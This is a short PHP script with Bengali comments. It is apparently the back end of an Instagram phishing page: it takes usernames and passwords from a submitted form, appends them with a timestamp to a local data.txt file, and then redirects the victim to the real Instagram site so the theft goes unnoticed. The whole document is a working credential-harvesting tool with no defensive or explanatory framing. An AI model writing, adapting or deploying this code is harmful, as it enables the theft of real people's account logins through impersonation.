<?php
// 1. ফর্ম সাবমিট হলে ডেটা নেওয়া
if(isset($_POST['username']) && isset($_POST['password'])) {
    
    $username = $_POST['username'];
    $password = $_POST['password'];
    
    // 2. ডেটা আপনার পিসির একটি text ফাইলে সেভ করা
    $file = 'data.txt'; // এই ফাইলটি আপনার 'instagram' ফোল্ডারে তৈরি হবে
    $current_data = file_get_contents($file); // আগের ডেটা পড়া
    $new_data = $current_data . "\n" . "Username: " . $username . " | Password: " . $password . " | Time: " . date('Y-m-d H:i:s');
    file_put_contents($file, $new_data); // নতুন ডেটা ফাইলে লেখা

    // 3. ইউজারকে রিয়েল ইনস্টাগ্রামে পাঠানো
    header("Location: https://www.instagram.com"); 
    exit(); // কোড স্টপ করা
}
?>